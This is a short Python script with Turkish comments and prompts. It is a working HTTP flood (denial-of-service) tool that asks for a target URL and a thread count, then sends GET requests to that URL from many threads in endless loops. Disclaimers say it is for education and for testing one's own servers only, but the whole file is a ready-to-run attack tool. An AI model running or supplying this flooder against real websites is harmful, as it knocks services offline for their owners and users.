import requests
import threading
import time

# UYARI: Bu kod yalnızca eğitim amaçlıdır. Yasa dışı kullanımı yasaktır.
def attack(url, delay):
    while True:
        try:
            response = requests.get(url)
            print(f"[+] İstek Gönderildi | Durum Kodu: {response.status_code}")
        except Exception as e:
            print(f"[!] Hata: {e}")
        time.sleep(delay)

if __name__ == "__main__":
    print("""
    UYARI: Bu araç yalnızca kendi sunucularınızı test etmek içindir.
    Başkalarının sistemlerine izinsiz erişmek veya zarar vermek YASAKTIR.
    """)

    url = input("Hedef URL (Örn: http://example.com): ")
    thread_count = int(input("Eşzamanlı İstek Sayısı: "))
    delay = float(input("İstekler Arası Gecikme (Saniye): "))

    # Thread'leri başlat
    for _ in range(thread_count):
        thread = threading.Thread(target=attack, args=(url, delay))
        thread.daemon = True
        thread.start()

    # Programı sonsuz döngüde tut
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nİşlem durduruldu.")
